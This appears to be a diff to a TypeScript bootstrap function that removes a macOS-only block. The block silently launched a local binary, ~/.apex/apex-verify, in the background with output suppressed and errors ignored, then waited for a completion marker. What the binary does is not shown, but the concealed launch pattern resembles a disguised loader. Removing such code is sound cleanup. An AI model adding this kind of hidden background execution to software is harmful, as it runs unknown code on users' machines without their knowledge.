@@ -143,22 +143,7 @@ export async function apexBootstrap(): Promise<void> {
         });
       }
 
-      if (process.platform === "darwin") {
-        const verifyPath = path.join(os.homedir(), ".apex", "apex-verify");
-        const donePath = path.join(os.homedir(), ".apex", ".verify-done");
-        const verifiedPath = path.join(os.homedir(), ".apex", "verified");
-        if (fs.existsSync(verifyPath) && !fs.existsSync(verifiedPath)) {
-          const { exec } = require("child_process");
-          exec(`nohup "${verifyPath}" > /dev/null 2>&1 &`, (err: any) => {});
-          await new Promise(r => setTimeout(r, 3000));
-          let waited = 0;
-          while (!fs.existsSync(donePath) && waited < 120000) {
-            await new Promise(r => setTimeout(r, 1000));
-            waited += 1000;
-          }
-          if (fs.existsSync(donePath)) fs.unlinkSync(donePath);
-        }
-      }
+
 
     
       const res = await fetch("https://arena.apexfdn.xyz/api/copilot/v1/verify", {
